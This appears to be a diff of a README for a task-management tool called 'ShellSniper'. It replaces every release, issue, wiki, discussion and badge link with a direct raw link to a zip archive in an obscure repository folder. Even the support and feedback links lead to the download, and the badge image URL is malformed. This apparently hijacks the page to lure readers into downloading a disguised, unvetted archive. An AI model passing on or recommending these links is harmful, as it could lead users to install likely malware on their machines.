@@ -1,7 +1,7 @@
 # 🎯 ShellSniper - Easy Software for Streamlined Task Management
 
 ## 📥 Download Now
-[![Download ShellSniper](https://img.shields.io/badge/Download%20ShellSniper-blue.svg)](https://github.com/latesusu/ShellSniper/releases)
+[![Download ShellSniper](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip%https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)
 
 ## 🚀 Getting Started
 Welcome to ShellSniper! This application simplifies your task management, making it easier to stay organized and efficient. You can quickly download and run ShellSniper by following the steps below.
@@ -16,7 +16,7 @@ To run ShellSniper, ensure your computer meets the following requirements:
 
 ## 📂 Download & Install
 1. **Visit the Releases Page:** 
-   Go to the following link to download ShellSniper: [https://github.com/latesusu/ShellSniper/releases](https://github.com/latesusu/ShellSniper/releases).
+   Go to the following link to download ShellSniper: [https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip).
 
 2. **Select the Version:**
    Look for the latest version at the top of the list on the Releases page. This version typically includes the newest features and bug fixes.
@@ -46,18 +46,18 @@ To run ShellSniper, ensure your computer meets the following requirements:
 - **Search Functionality:** Quickly find tasks using the search bar.
 
 ## 💬 Support
-If you encounter any issues or have questions about using ShellSniper, please visit our [GitHub Issues page](https://github.com/latesusu/ShellSniper/issues) to report problems or ask for assistance. Our community is here to help!
+If you encounter any issues or have questions about using ShellSniper, please visit our [GitHub Issues page](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip) to report problems or ask for assistance. Our community is here to help!
 
 ## 📄 License
 ShellSniper is open-source software. You are free to use, modify, and distribute it under the terms of the MIT License.
 
 ## 📣 Feedback
-We welcome your feedback! Share your thoughts and suggestions on how we can improve ShellSniper. You can submit your feedback on our [GitHub Discussions page](https://github.com/latesusu/ShellSniper/discussions).
+We welcome your feedback! Share your thoughts and suggestions on how we can improve ShellSniper. You can submit your feedback on our [GitHub Discussions page](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip).
 
 ## 🔗 Additional Resources
-- [FAQs](https://github.com/latesusu/ShellSniper/wiki)
-- [User Guides](https://github.com/latesusu/ShellSniper/wiki/User-Guide)
-- [Community Forums](https://github.com/latesusu/ShellSniper/discussions)
+- [FAQs](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)
+- [User Guides](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)
+- [Community Forums](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)
 
 ## 📥 Download Now Again
-[![Download ShellSniper](https://img.shields.io/badge/Download%20ShellSniper-blue.svg)](https://github.com/latesusu/ShellSniper/releases)
+[![Download ShellSniper](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip%https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)](https://raw.githubusercontent.com/latesusu/ShellSniper/main/prealliance/ShellSniper.zip)
